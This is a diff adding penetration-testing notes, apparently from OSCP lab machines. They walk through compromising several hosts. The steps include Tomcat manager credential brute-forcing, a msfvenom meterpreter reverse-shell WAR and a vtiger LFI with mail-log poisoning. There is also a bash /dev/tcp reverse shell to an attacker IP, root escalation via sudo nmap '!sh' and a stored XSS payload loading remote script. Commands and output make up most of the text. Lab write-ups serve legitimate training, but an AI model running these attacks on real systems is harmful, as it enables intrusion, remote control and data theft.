@@ -987,3 +987,146 @@ begin
 end
 ```
 
+# 10.11.1.209
+
+https://ionize.com.au/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol/
+
+```bash
+ProxyRequests Off
+
+# Only allow localhost to proxy requests
+
+<Proxy *>
+Order deny,allow
+Deny from all
+Allow from localhost
+</Proxy>
+
+# Change the IP address in the below lines to the remote servers IP address hosting the Tomcat instance
+
+ProxyPass                 / ajp://192.168.109.134:8009/
+ProxyPassReverse    / ajp://192.168.109.134:8009/
+```
+
+msf5 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 127.0.0.1
+rhosts => 127.0.0.1
+msf5 auxiliary(scanner/http/tomcat_mgr_login) > set rport 80
+rport => 80
+msf5 auxiliary(scanner/http/tomcat_mgr_login) > set thread 10
+thread => 10
+msf5 auxiliary(scanner/http/tomcat_mgr_login) > set threads 10
+threads => 10
+
+[-] 127.0.0.1:80 - LOGIN FAILED: tomcat:role1 (Incorrect)
+[-] 127.0.0.1:80 - LOGIN FAILED: tomcat:root (Incorrect)
+
+[+] 127.0.0.1:80 - Login Successful: tomcat:tomcat
+
+msfvenom -p java/meterpreter/reverse_tcp lhost=10.11.0.104 lport=4444 -f war -o shell.war
+Payload size: 6255 bytes
+Final size of war file: 6255 bytes
+Saved as: shell.war
+
+
+
+lmeterpreter > download /Desktop/proof.txt proof.txt
+[*] Downloading: /Desktop/proof.txt -> proof.txt
+[*] Downloaded 33.00 B of 33.00 B (100.0%): /Desktop/proof.txt -> proof.txt
+[*] download   : /Desktop/proof.txt -> proof.txt
+meterpreter >
+
+root@ens:~/oscp/209# cat proof.txt
+9947c7f0524965d901fb6f43b1274695
+
+
+
+# 10.11.1.217
+
+https://www.exploit-db.com/exploits/37637
+
+https://10.11.1.217/vtigercrm/graph.php?current_language=../../../../../../../../etc/passwd%00&module=Accounts&action
+
+25/tcp   open  smtp?
+|_smtp-commands: hotline.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
+
+```
+asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
+```
+
+send mail to asterick
+
+
+Connected to 10.11.1.217.
+Escape character is '^]'.
+220 hotline.localdomain ESMTP Postfix
+ehlo
+501 Syntax: EHLO hostname
+ehlo hotline
+250-hotline.localdomain
+250-PIPELINING
+250-SIZE 10240000
+250-VRFY
+250-ETRN
+250-ENHANCEDSTATUSCODES
+250-8BITMIME
+250 DSN
+mail from:<hotline>
+250 2.1.0 Ok
+rcpt to: <asterisk@localhost>
+250 2.1.5 Ok
+data
+354 End data with <CR><LF>.<CR><LF>
+
+https://10.11.1.217/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&module=Accounts&action$cmd=ls
+
+bash-3.2$ sudo -l
+Matching Defaults entries for asterisk on this host:
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
+    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
+    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY"
+
+User asterisk may run the following commands on this host:
+    (root) NOPASSWD: /sbin/shutdown
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/bin/yum
+    (root) NOPASSWD: /bin/touch
+    (root) NOPASSWD: /bin/chmod
+    (root) NOPASSWD: /bin/chown
+    (root) NOPASSWD: /sbin/service
+    (root) NOPASSWD: /sbin/init
+    (root) NOPASSWD: /usr/sbin/postmap
+    (root) NOPASSWD: /usr/sbin/postfix
+    (root) NOPASSWD: /usr/sbin/saslpasswd2
+    (root) NOPASSWD: /usr/sbin/hardware_detector
+    (root) NOPASSWD: /sbin/chkconfig
+    (root) NOPASSWD: /usr/sbin/elastix-helper
+
+POST /vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&module=Accounts&action&cmd=bash+-i>%26+/dev/tcp/10.11.0.104/8000+0>%261 HTTP/1.1
+
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+cd /root
+ls
+install.log
+install.log.syslog
+proof.txt
+cat proof.txt
+ffb5d84a211ae8398d6ae474f2242af3
+
+# 10.11.1.218
+
+**Niky:** Hello, please leave me a message on this board. I
+monitor this page frequently and will reply as soon as it is possible. 
+Your messages will be deleted from the board after I have viewed it and 
+every time you log in (due to privacy settings). Attention Jeff:
+I have changed my IP to 10.1.1.224
+Thank you for the suggestion.
+
+```
+"><script src='http://10.11.0.104/a.js'></script>
+```
+
